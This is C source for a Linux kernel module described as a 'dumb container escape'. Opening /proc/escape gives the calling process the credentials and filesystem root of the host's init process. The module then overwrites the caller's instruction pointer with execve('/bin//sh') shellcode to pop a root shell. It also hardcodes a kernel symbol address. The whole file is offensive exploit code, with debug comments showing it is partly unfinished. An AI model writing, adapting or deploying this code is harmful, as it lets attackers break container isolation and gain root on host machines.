#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/init.h>
#include <linux/fs_struct.h>
#include <linux/sched.h>
#include <linux/seq_file.h>
#include <linux/sched/task_stack.h>
#include <asm/uaccess.h>
#include <asm/processor.h>

#define PROCFS_NAME "escape"
#define SHELLCODE_LEN 23

MODULE_LICENSE("GPL");
MODULE_AUTHOR("null333");
MODULE_DESCRIPTION("dumb container escape");
MODULE_VERSION("1.1");

char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int procfs_open(struct inode *inode, struct file *file);
static int procfs_show(struct seq_file *m, void *v);
// sudo cat /proc/kallsyms | grep copy_fs_struct
struct fs_struct * (*copy_fs_struct__)(struct fs_struct *) = (void *) 0xffffffffb4b2ce90;

struct proc_dir_entry *procfile_entry;

static const struct proc_ops procfile_fops = {
    .proc_open = procfs_open,
    .proc_read = seq_read,
    .proc_lseek = seq_lseek,
    .proc_release = single_release
};


static int __init escape_mod_init(void)
{
    procfile_entry = proc_create(PROCFS_NAME, 0, NULL, &procfile_fops);

    if (procfile_entry == NULL)
    {
      printk(KERN_INFO "failed to create procfile\n");
      return -ENOMEM;
    }

    printk(KERN_INFO "procfile created\n");
    return 0;
}

// __exit breaks shit lol
// https://stackoverflow.com/questions/32390301/why-is-exit-used-in-kernel-module-programming
static void __exit escape_mod_exit(void)
{
    remove_proc_entry(PROCFS_NAME, NULL);
    printk(KERN_INFO "procfile removed\n");
}

int procfs_open(struct inode *inode, struct file *file)
{
    printk(KERN_INFO "popping shell for pid %i\n", current->pid);

    struct task_struct *init_proc = pid_task(find_vpid(1), PIDTYPE_PID);
    struct cred *new_cred = prepare_creds();
    if (new_cred == NULL)
    {
        printk(KERN_INFO "failed to copy root creds\n");
        return -ENOMEM;
    }
    new_cred = init_proc->cred;
    commit_creds(new_cred);

    current->fs = copy_fs_struct__(init_proc->fs);

    // https://stackoverflow.com/questions/64577963/get-userspace-rbp-register-from-kernel-syscall
    struct pt_regs *c_regs = task_pt_regs(current);

    printk(KERN_INFO "DEBUG -- ip: %p", c_regs->ip);
    copy_to_user((void *) c_regs->ip, shellcode, SHELLCODE_LEN);
    c_regs = task_pt_regs(current);
    // c_regs is NULL after this for some reason?
    printk(KERN_INFO "DEBUG -- got here lol", c_regs->ip);

	return 0;
}

static int procfs_show(struct seq_file *m, void *v)
{
    seq_printf(m, "bye lol\n");
    return 0;
}

module_init(escape_mod_init);
module_exit(escape_mod_exit);
